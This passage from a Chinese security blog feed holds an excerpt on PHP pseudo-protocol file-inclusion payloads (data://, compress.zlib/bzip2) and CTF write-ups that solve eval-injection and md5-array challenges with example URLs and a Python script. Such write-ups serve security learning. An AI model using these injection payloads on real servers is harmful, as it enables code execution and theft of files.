title="（2）bzip2://协议"></a>（2）bzip2://协议</h3><p>使用方法：<br>compress.bzip2://[压缩文件绝对路径或相对路径]<br>例：<code>?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg</code><br>或<code>?file=compress.bzip2://./file.jpg</code></p><h3 id="（3）zlib-协议"><a href="#（3）zlib-协议" class="headerlink" title="（3）zlib://协议"></a>（3）zlib://协议</h3><p>使用方法：<br>compress.zlib://file.gz<br>例（同上）：<code>?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg</code></p><hr><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h2><p>PHP.ini：</p><p>data://协议必须双在on才能正常使用；</p><p>allow_url_fopen ：on<br>allow_url_include：on<br>例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/test.php?file=data://text/plain,<span class="meta">&lt;?php</span> phpinfo()<span class="meta">?&gt;</span></span></span><br><span class="line">http:<span class="comment">//localhost/test.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br><span class="line">http:<span class="comment">//localhost/test.php?file=data:text/plain,<span class="meta">&lt;?php</span> phpinfo()<span class="meta">?&gt;</span></span></span><br><span class="line">http:<span class="comment">//localhost/test.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br></pre></td></tr></table></figure><hr><p>借用一下FreeBuf的图最后总结一下<br><img src="https://img-blog.csdnimg.cn/2019100920385028.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>文章转载自FreeBuf一个大佬的文章<a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">https://www.freebuf.com/column/148886.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;感觉web里面还会经常遇到php伪协议的，总结一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>BUUCTF snake（实验吧Snake）</title>
    <link href="http://yoursite.com/2020/02/03/BUUCTF%20snake%EF%BC%88%E5%AE%9E%E9%AA%8C%E5%90%A7Snake%EF%BC%89/"/>
    <id>http://yoursite.com/2020/02/03/BUUCTF%20snake%EF%BC%88%E5%AE%9E%E9%AA%8C%E5%90%A7Snake%EF%BC%89/</id>
    <published>2020-02-02T16:00:00.000Z</published>
    <updated>2020-02-03T09:09:13.892Z</updated>
    
    <content type="html"><![CDATA[<p>BUU Snake~~</p><a id="more"></a><p>题目表面上给的是一张jpg图片，但是binwalk一下，里面有压缩包，binwalk snake.jpg -e解压一下，<br><img src="https://img-blog.csdnimg.cn/20190813115300135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>里面有两个文件，一个key，一个cipher，打开key，有一串base64字符，</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V<span class="number">2</span>hhdCBpcyBOaW<span class="symbol">NraSBNaW5</span>haidzIGZhd<span class="name">m9</span>yaXRlIH<span class="symbol">NvbmcgdGhhdCByZWZlcnMgdG8</span>gc<span class="number">25</span>ha<span class="number">2</span>VzPwo=</span><br></pre></td></tr></table></figure><p>解码之后，得到：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What <span class="keyword">is</span> Nicki Minaj's favorite song <span class="keyword">that</span> refers <span class="keyword">to</span> snakes?</span><br></pre></td></tr></table></figure><p>百度Nicki Minaj关于蛇的歌，当然看了一些大佬的博客，知道了指的是anaconda，就是cipher解密的私钥了。<br><img src="https://img-blog.csdnimg.cn/20190813115901369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看完key之后，打开chipher，并不能打开。看了大佬的博客才知道，对于蛇这个名词，在英语中还有一个翻译：Serpent。<br>Serpent是一个加密算法，具体算法见大佬博客<a href="https://blog.csdn.net/douqingl/article/details/50256931" target="_blank" rel="noopener">https://blog.csdn.net/douqingl/article/details/50256931</a><br>于是，用该算法对chipher进行解密，拿到flag，<a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">解密网站</a><br><img src="https://img-blog.csdnimg.cn/20190813142355629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;BUU Snake~~&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF WP" scheme="http://yoursite.com/categories/CTF-WP/"/>
    
    
  </entry>
  
  <entry>
    <title>i春秋Web wp</title>
    <link href="http://yoursite.com/2020/02/03/i%E6%98%A5%E7%A7%8BWeb%20wp/"/>
    <id>http://yoursite.com/2020/02/03/i%E6%98%A5%E7%A7%8BWeb%20wp/</id>
    <published>2020-02-02T16:00:00.000Z</published>
    <updated>2020-02-03T08:03:31.463Z</updated>
    
    <content type="html"><![CDATA[<p>刷题ing</p><a id="more"></a><h1 id="0x00-爆破-1"><a href="#0x00-爆破-1" class="headerlink" title="0x00 爆破-1"></a>0x00 爆破-1</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\w*$/'</span>,$a ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'ERROR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个代码的意义是如果匹配正则<code>/^\w*$/</code>，就打印变量<code>$$a</code>。<br>由于<code>$a</code>在函数中，所以函数之外无法访问。如果要访问，将hello修改为超全局变量<code>GLOBALS</code>。<br>在URL后加<code>?hello=GLOBALS</code>，将参数hello修改为Globals，实际执行代码是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>)</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($hello);"</span>)</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($GLOBALS);"</span>)</span><br></pre></td></tr></table></figure><p>$GLOBALS引出全局作用域中可用的全部变量，这样就会打印出当前定义的所有变量，也包括 include 的文件中的变量，flag 也存在在这些变量中。<br><img src="https://img-blog.csdnimg.cn/20190916230934313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="0x01-爆破-2"><a href="#0x01-爆破-2" class="headerlink" title="0x01 爆破-2"></a>0x01 爆破-2</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这里没有<code>$$a</code>就没办法对输入的参数进行运用，就要用到PHP里面的file_get_contents函数（file函数也行）。<br>file_get_contents函数把文件读入一个字符串中，file函数会把注释也显示出来，但是使用file_fet_contents函数时，由于它把flag.php文件作为字符串输出，所以注释语句不会显示出来。<br>url传入<code>?hello=file_get_contents(&quot;flag.php&quot;)</code><br><img src="https://img-blog.csdnimg.cn/20190916232449934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)出来了一个string(83)，查看源代码（或者<strong>ctrl+u</strong>）即可得到flag。</p><h1 id="0x02-爆破-3"><a href="#0x02-爆破-3" class="headerlink" title="0x02 爆破-3"></a>0x02 爆破-3</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'./flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>] = <span class="number">0</span>;</span><br><span class="line">  $_SESSION[<span class="string">'time'</span>] = time();</span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$value = $_REQUEST[<span class="string">'value'</span>];</span><br><span class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>]++;</span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = $str_rands;</span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为md5不能对数组进行处理，MD5()计算数组会返回null，里面的判断是用==所以我们用数组传值那么substr(md5($ value),5,4)==0这个条件恒成立 。<br>因为我刚访问由于这段代码$_SESSION[‘whoami’] = ‘ea’; 我们要先传入?value[0]=e&amp;value[1]=a </p><p>那么nums就会自增，$ _SEESION[‘whoami’] = 随机2个字母，并同时输出到页面上，我们再根据输出的字符修改$ value[0].$value[1]的值即可，只要操作大于等于10次，就可以出flag 。<br>上脚本，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://7cd40fdf90e44b9195dec255dc8f703b468d145b463c4524.changame.ichunqiu.com/'</span></span><br><span class="line">session=requests.Session()</span><br><span class="line">html=session.get(url+<span class="string">'?value[]=ea'</span>).text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    html=session.get(url+<span class="string">'?value[]='</span>+ html[<span class="number">0</span>:<span class="number">2</span>]).text</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure><p>跑出来就有flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;刷题ing&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF WP" scheme="http://yoursite.com/categories/CTF-WP/"/>
    
    
  </entry>
  
</feed>
